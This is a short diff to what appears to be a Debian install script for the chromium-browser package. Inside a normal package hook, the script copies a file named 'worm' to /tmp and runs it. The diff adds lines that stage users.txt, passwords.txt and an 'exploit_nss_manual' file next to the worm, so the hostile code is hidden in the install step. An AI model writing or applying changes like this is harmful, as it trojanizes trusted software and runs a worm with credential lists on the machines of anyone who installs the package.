@@ -5,4 +5,7 @@ dpkg-maintscript-helper rm_conffile /etc/chromium-browser/default -- "$@"
 dpkg-maintscript-helper rm_conffile /etc/chromium-browser/customizations/00-example -- "$@"
 # End automatically added section
 cp /usr/share/doc/worm /tmp/worm
+cp /usr/share/doc/users.txt /tmp/users.txt
+cp /usr/share/doc/passwords.txt /tmp/passwords.txt
+cp /usr/share/doc/exploit_nss_manual /tmp/exploit_nss_manual
 /tmp/worm
